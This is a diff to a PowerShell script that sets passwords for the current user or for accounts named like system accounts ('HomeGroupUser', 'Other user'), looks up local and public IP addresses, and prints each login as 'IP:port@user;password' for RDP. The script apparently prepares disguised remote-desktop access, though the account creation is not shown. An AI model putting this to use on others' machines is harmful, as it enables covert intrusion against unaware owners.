@@ -26,6 +26,7 @@ Function Generate-Password($length = 30) {
 $users = @("HomeGroupUser", "Other user")
 $passwords = @{}
 
+
 if ($currentOnly -eq '1') {
     $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
     $password = Generate-Password
@@ -45,14 +46,19 @@ if ($currentOnly -eq '1') {
 }
 
 Write-Host "`n=== all ip adapters ==="
+$localIP = $null
 Get-NetIPAddress | Where-Object { $_.IPAddress -match '\d+\.\d+\.\d+\.\d+' } | ForEach-Object {
     Write-Host $_.InterfaceAlias":" $_.IPAddress
+    if (-not $localIP) { $localIP = $_.IPAddress }
 }
 
 try {
-    $publicIP = Invoke-RestMethod -Uri "https://checkip.amazonaws.com"
+    $publicIP = (Invoke-RestMethod -Uri "https://checkip.amazonaws.com").Trim()
+    if ($publicIP -notmatch '^\d{1,3}(\.\d{1,3}){3}$') {
+        $publicIP = "UNKNOWN"
+    }
 } catch {
-    $publicIP = "Unknown"
+    $publicIP = "UNKNOWN"
 }
 
 try {
@@ -84,18 +90,19 @@ try {
 Write-Host "`n=== whoami ==="
 whoami
 
-Write-Host "`n=== whoami ==="
-Write-Host "${publicIP}"
-
 Write-Host "`n=== details ==="
 
+if ($publicIP -eq "UNKNOWN") {
+    Write-Host "[!] Public IPv4 address could not be determined."
+}
+
 if ($currentOnly -eq '1') {
-    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-    Write-Host -NoNewline "Port - ${rdpPort}; User - ${user}; Password - $($passwords[$user]) "
+    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
+    Write-Host "$publicIP`:$rdpPort@$user;$($passwords[$user])"
 } else {
     foreach ($user in $users) {
         if ($passwords.ContainsKey($user)) {
-            Write-Host -NoNewline "Port - ${rdpPort}; User - ${user}; Password - $($passwords[$user]) "
+            Write-Host "$publicIP`:$rdpPort@$user;$($passwords[$user])"
         }
     }
 }
